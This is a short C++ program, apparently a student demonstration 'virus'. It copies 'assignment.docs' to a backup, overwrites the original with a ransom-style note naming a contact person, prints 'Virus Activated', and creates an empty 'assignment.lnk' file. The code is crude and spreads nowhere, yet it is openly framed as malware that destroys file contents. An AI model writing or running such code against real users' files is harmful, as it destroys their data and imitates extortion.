#include <iostream>
#include <fstream>
using namespace std;

int main() {
    // Open the input file 'assignment.docs' for reading
    ifstream readFile("assignment.docs");

    // Open the output file 'backup.docs' for writing
    ofstream writeFile("backup.docs");

    // Check if the input file 'assignment.docs' was successfully opened
    if (!readFile.is_open()) {
        cerr << "Error: Unable to open input file 'assignment.docs'" << endl;
        return 1; // Exit the program with an error code
    }

    // Check if the output file 'backup.docs' was successfully opened
    if (!writeFile.is_open()) {
        cerr << "Error: Unable to open output file 'backup.docs'" << endl;
        return 1; // Exit the program with an error code
    }

    string inputText;

    // Read each line from 'assignment.docs' and write it to 'backup.docs'
    while (getline(readFile, inputText)) {
        writeFile << inputText << endl;
    }

    cout << "Virus Initiated !!!" << endl;

    // Close the input and output files
    writeFile.close();
    readFile.close();

    // Open 'assignment.docs' again for writing replacement content
    ofstream writeReplacementContent("assignment.docs");

    // Check if the file 'assignment.docs' was successfully opened
    if (writeReplacementContent.is_open()) {
        // Write a message indicating that the file is affected
        writeReplacementContent << "Your File is Affected. Contact Terence Faid JABO .....\n\n\n";
        writeReplacementContent.close(); // Close the file
    } else {
        cerr << "Error: Unable to open file 'assignment.docs' for writing replacement content" << endl;
        return 1; // Exit the program with an error code
    }

    cout << "\n\nVirus Activated Successfully!!" << endl;

    // Create a new file 'assignment.lnk'
    ofstream writeReplacementContentShort("assignment.lnk");

    return 0; // Exit the program with a success code
}
